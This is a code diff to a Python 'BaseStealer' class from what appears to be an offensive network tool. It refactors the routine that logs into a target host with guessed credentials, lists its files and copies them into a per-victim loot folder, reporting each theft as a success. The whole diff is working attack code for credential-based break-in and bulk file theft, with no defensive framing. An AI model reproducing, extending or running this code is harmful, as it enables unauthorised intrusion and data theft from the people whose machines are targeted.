@@ -155,6 +155,26 @@ class BaseStealer:
         return os.path.join(self.shared_data.datastolendir,
                             f"{self.LOOT_SUBDIR}/{row['MAC Address']}_{ip}")
 
+    def harvest(self, conn, ip, row):
+        """Default find-then-steal loop. Adapters with non-ROOT topology (SMB shares, SQL
+        tables) or that treat a successful auth with zero loot as a win override this.
+
+        Returns True when the run should be recorded as success for this credential.
+        """
+        remote_files = self.find_files(conn, self.ROOT)
+        if not remote_files:
+            return False
+        local_dir = self.loot_dir(ip, row)
+        for remote_file in remote_files:
+            if self.stop_execution or self.shared_data.orchestrator_should_exit:
+                self.LOGGER.info("Steal interrupted.")
+                break
+            self.steal_file(conn, remote_file, local_dir)
+        self.LOGGER.success(
+            f"Successfully stolen {len(remote_files)} file(s) from "
+            f"{ip} using credential")
+        return True
+
     # ---------------------------------------------------------------- the flow
 
     def execute(self, ip, port, row, status_key):
@@ -204,17 +224,7 @@ class BaseStealer:
                     try:
                         self.LOGGER.info(f"Trying credential {username} for {ip}")
                         conn = self.open_session(ip, username, password)
-                        remote_files = self.find_files(conn, self.ROOT)
-                        if remote_files:
-                            local_dir = self.loot_dir(ip, row)
-                            for remote_file in remote_files:
-                                if self.stop_execution or self.shared_data.orchestrator_should_exit:
-                                    self.LOGGER.info("Steal interrupted.")
-                                    break
-                                self.steal_file(conn, remote_file, local_dir)
-                            self.LOGGER.success(
-                                f"Successfully stolen {len(remote_files)} file(s) from "
-                                f"{ip}:{port} using {username}")
+                        if self.harvest(conn, ip, row):
                             return 'success'
                     except Exception as e:
                         self.LOGGER.error(f"Error stealing from {ip} as {username}: {e}")
